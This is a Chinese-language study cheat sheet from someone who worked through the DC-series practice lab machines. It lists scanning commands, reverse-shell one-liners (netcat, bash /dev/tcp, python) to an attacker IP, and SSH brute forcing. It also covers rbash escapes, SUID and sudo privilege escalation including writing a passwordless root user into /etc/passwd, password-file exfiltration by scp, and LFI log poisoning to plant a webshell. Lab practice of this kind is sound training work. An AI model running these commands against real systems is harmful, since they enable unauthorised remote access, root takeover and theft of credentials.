前言

花了好一段的时间再一次打了一遍DC系列9个靶机。也算是巩固了一下之前的所学，然后总结了9个靶机所用到的一些知识点和命令。

局域网发现

arp-scan -l / nmap -sn xxxxx / netdiscover

nmap端口探测常用命令

nmap -sS -sV -A -T4 -p- 192.168.40.134
nmap -Pn -T4 -A -v -p- ip --script=vuln
nmap -sC -sV -p- -T4 ip
-sS //SYN扫描,使用最频繁，安全，快
-Pn //目标机禁用ping，绕过ping扫描
-sT //TCP连接扫描，不安全，慢
-sC //使用脚本进行扫描，耗时长
-A //强力扫描，耗时长
-sV //对端口上的服务程序版本进行扫描
-sn //对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）
-sP //仅仅对目标进行ping检测,主机存活性扫描，arp直连方式

反弹shell的常用姿势（在获取webshell的前提下）

利用nc反弹shell
本地监听2333 端口
nc -lnvp 2333

服务端反弹（下面的ip为kali的ip）
nc -e /bin/bash 192.168.40.144 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.16.100 2333>/tmp/f（nc无 -e功能的时候）
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.16.100 2333>/tmp/f
/bin/sh -i >& /dev/tcp/192.168.16.100/2333 0>&1

利用bash反弹shell
bash -i >& /dev/tcp/192.168.61.145/2222 0>&1

利用python反弹shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.72.141",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

靶机中关于ssh

登录：
ssh tom@192.168.40.137 -p 7744
或者 ssh -l tom -p 7744 192.168.40.137

爆破：hydra -L username.txt -P passwd.txt 192.168.40.130 ssh -s 7744
或者medusa -M ssh -h 192.168.72.156 -u jim -P old-passwords.bak -t 10
-t 代表线程数，为提高准确度，避免设置太高

发现无法连接ssh，提示被拒绝：
可能是使用了Knockd进行防护-->以直接用nc敲击端口。(参考DC9)
先使用LFI(本地文件包含)漏洞读取该配置文件-->?file=../../../../../../../../etc/knockd.conf （knockd.conf默认路径）
用nc敲击后再进行登录或者爆破：nc xxx.xxx.xx.xx 7696 / xxxxxx

绕过rbash限制

BASH_CMDS[a]=/bin/sh;a #调用/bin/sh命令解释器
/bin/bash #使用bash命令解释器
添加环境变量：
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
(首用上面的)
或者：PATH=$PATH:/bin
PATH=$PATH:/usr/bin

查看用户可用命令

echo $PATH
例如：echo /home/tom/usr/bin/*
ls $PATH

靶机中关于提权

首先需要明确，不能使用蚁剑提权，因为HTTP是瞬时协议，我这边正提权呢，你那边TCP四次挥手断开连接了，不能持久连接，所以蚁剑的作用就在于上传文件来反弹shell。
首先查看主机上可用的工具,根据靶机环境来进行提权:whereis git php python wget gcc

在这里补充一下，在已知账号和密码的情况下，可以先尝试直接使用已知账号的密码提权
sudo -i (获得一个持久的root shell)
sudo su root (切换为root用户)

1、SUID提权：使用find找下具有root权限的suid(已知可用来提权的linux文件:Nmap Vim find Bash More Less Nano)
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;

①find提权利用：find / ‐name xxxx ‐exec "/bin/sh" ; (xxx为已有文件)
这个文件也可以自己创建一个，比如说去/tmp文件夹中随便创建个666
②screen-4.5.0提权利用：searchsploit screen 4.5.0
参考DC5靶机
③exim4提权利用：
查看exim4当前版本号:/usr/sbin/exim4 --version
searchsploit exim(参考DC8靶机)

2、sudo -l //查看可以使用root权限无密码的命令
①root免密使用git提权:
sudo git help config
!/bin/bash或者！'sh'完成提权
sudo git -p help
!/bin/bash
②root免密使用teehee提权:
思路一：利用teehee的root权限在passwd中写入一个免密root权限用户
echo "test::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
思路二：利用teehee往sudoers里写入charles ALL=(ALL:ALL) ALL 让原用户可以无密码执行sudo
echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers
③root免密执行xx用户身份的sh脚本：
在末尾增加/bin/bash（直接对该文件写入调用bash的命令），以xx用户身份运行该文件即可获得目标shell
echo "/bin/bash" >>/home/xxx/backups.sh
sudo -u xxx ./backups.sh
即可得到xx用户的shell
④root免密使用nmap提权
nmap有执行脚本的功能，通过编写特殊脚本，可以实现利用nmap提权（sudo提权）
利用过程：写入一个执行bash的nmap脚本，以root权限免密运行
echo 'os.execute("/bin/sh")' > getShell
sudo -u root nmap --script=getShell
或者 sudo nmap --script=getShell

3、使用辅助脚本提权(参考DC3靶机)
使用一个辅助脚本来发现系统中存在哪些漏洞，注意到上传到有权限上传的地方，好比tmp是存放临时文件的，我有权限上传文件。
使用中国蚁剑上传文件，顺带着修改一下文件名（因为这里的shell不支持补齐，名字太长不方便）
使用脚本：
cd /tmp
ls -lh
chmod +x power.sh
./power.sh

例如，获取下Linux版本，可以看到是Ubuntu 16.04，searchsploit搜索可以利用提权的exp

文件传输

将靶机中的密码文件传到kali中，这里用SCP来传输
首先在kali上开启ssh服务 service ssh start

在靶机中执行命令将密码文件传到kali中 : scp ./old-passwords.bak root@192.168.72.146:/root/

文件包含利用

发现存在文件包含，但是如果想要利用的话，就必须确认这个文件包含的动态的，是可控的，而要确认这一点，首先需要知道它实现包含的参数是什么？
上bp进行路径(path、file...)和内容(../../../etc/passwd)的爆破
接下来需要判断他是不是可以远程文件包含，如果可以的话，那就直接上木马，如果没有，再另寻他法。

在已知存在包含漏洞的情况下，可以利用网站的日志文件来获得shell
nginx的默认log文件为：/var/log/nginx/error.log 或 /var/log/nginx/access.log
然后直接在UA或者bp的/222222 写入一句话用蚁剑连接log目录即可

因为log目录不太稳定，在服务器/tmp目录下新建一个shell.php文件，写入一句话木马并重新连接
使用蚁剑虚拟终端反弹shell到kali : nc -e /bin/bash 192.168.220.142 4567
在kali监听4567端口接收shell : nc -lvnp 4567

其实看到这会发现写入一句话连接蚁剑显得很多余。。。直接在bp中想办法执行系统命令直接反弹shell
测试:利用GET请求数据包在access.log中写入一个shell。

确实是否写入成功：?file=/var/log/nginx/access.log&abc=ls
使用获得的命令执行权限来反弹网站用户的shell：nc -e /bin/bash 192.168.189.128 8888
